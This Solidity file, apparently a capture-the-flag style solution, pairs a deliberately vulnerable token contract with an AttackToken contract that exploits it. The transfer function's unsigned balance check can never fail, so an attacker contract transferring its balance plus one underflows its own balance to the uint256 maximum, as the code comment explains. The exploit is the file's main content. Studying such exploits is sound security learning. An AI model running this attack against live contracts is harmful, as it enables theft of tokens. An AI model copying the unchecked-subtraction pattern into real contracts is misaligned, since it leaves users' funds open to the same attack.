// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

contract Token {

  mapping(address => uint) balances;
  uint public totalSupply;

  constructor(uint _initialSupply) public {
    balances[msg.sender] = totalSupply = _initialSupply;
  }

  function transfer(address _to, uint _value) public returns (bool) {
    require(balances[msg.sender] - _value >= 0);
    balances[msg.sender] -= _value;
    balances[_to] += _value;
    return true;
  }

  function balanceOf(address _owner) public view returns (uint balance) {
    return balances[_owner];
  }
}

contract AttackToken {
    Token token;
    
    constructor(address _token) public {
        token = Token(_token);
    }

    function attackToken(address user) public {
        uint bal = token.balanceOf(address(this));
        // this causes an underflow in the transfer and sets the attacker's balance to type(uint256).max value (115792089237316195423570985008687907853269984665640564039457584007913129639935)
        token.transfer(user, bal + 1);
    }
}
